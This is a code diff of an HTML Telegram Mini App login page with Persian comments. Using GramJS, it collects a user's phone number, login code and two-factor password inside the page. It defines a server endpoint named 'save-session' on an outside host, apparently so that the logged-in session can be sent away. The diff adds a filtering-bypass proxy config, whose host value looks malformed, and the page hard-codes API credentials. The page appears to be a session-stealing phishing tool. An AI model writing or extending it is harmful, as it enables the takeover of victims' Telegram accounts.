@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>ورود به اکانت</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
-<!-- GramJS از طریق CDN (نسخه bundle شده برای مرورگر) -->
+<!-- باندل محلی GramJS که خودتان ساختید (به‌جای CDN قبلی) -->
 <script src="./telegram.js"></script>
 <style>
   body { font-family: sans-serif; padding: 20px; background: #f5f5f5; }
@@ -20,11 +20,18 @@
 
 <h3>ورود به اکانت تلگرام</h3>
 
-<!-- این مقادیر را با API_ID و API_HASH خودتان (از my.telegram.org) جایگزین کنید -->
 <script>
   const API_ID = 34207006;                  // << جایگزین کنید
   const API_HASH = "b79f4a2536cf504a115ba0d4f0e88b58"; // << جایگزین کنید
   const SERVER_URL = "https://chaosexit.pythonanywhere.com/api/save-session"; // << جایگزین کنید
+
+  // تنظیمات پروکسی MTProxy - برای عبور از فیلترینگ شبکه
+  const PROXY_CONFIG = {
+    ip: "195.26.387-44qavi.ir",
+    port: 8443,
+    secret: "ee1044048187495dfac59a030220c25cb3626973636f7474692e79656b74616e65742e636f6d",
+    MTProxy: true,
+  };
 </script>
 
 <div id="step-phone" class="step active">
@@ -45,10 +52,6 @@
 <div id="status"></div>
 
 <script>
-  const { TelegramClient } = window.Telegram_ || window.telegram || {};
-  // پکیج GramJS در window با نام "window.telegram" یا export مشابه در دسترس است؛
-  // بسته به نسخه bundle ممکن است لازم باشد این خط را با کنسول مرورگر تطبیق دهید.
-
   const tg = window.Telegram?.WebApp;
   tg?.ready();
 
@@ -56,7 +59,6 @@
   let client;
   let phoneNumber;
   let phoneCodeHash;
-  let resolveCode, resolvePassword;
 
   function setStatus(msg) {
     document.getElementById("status").innerText = msg;
@@ -74,14 +76,13 @@
     setStatus("در حال اتصال به تلگرام...");
 
     const session = new StringSession("");
-    client = new TelegramClient(session, API_ID, API_HASH, {
+    client = new window.telegram.TelegramClient(session, API_ID, API_HASH, {
       connectionRetries: 5,
+      proxy: PROXY_CONFIG,
     });
 
     await client.connect();
 
-    // GramJS با client.start معمولاً کل فلو را مدیریت می‌کند؛
-    // اینجا برای کنترل دستی مرحله به مرحله از invoke مستقیم استفاده می‌کنیم.
     try {
       const { Api } = window.telegram;
       const result = await client.invoke(
@@ -126,7 +127,7 @@
   async function submitPassword() {
     const password = document.getElementById("password").value.trim();
     try {
-      // GramJS تابع کمکی computeCheck برای هش‌کردن رمز 2FA دارد
+      // نکته اصلاح‌شده: نام درست window.telegram.password (حرف کوچک)
       const { computeCheck } = window.telegram.password;
       const passwordInfo = await client.invoke(new window.telegram.Api.account.GetPassword());
       const passwordSrpCheck = await computeCheck(passwordInfo, password);
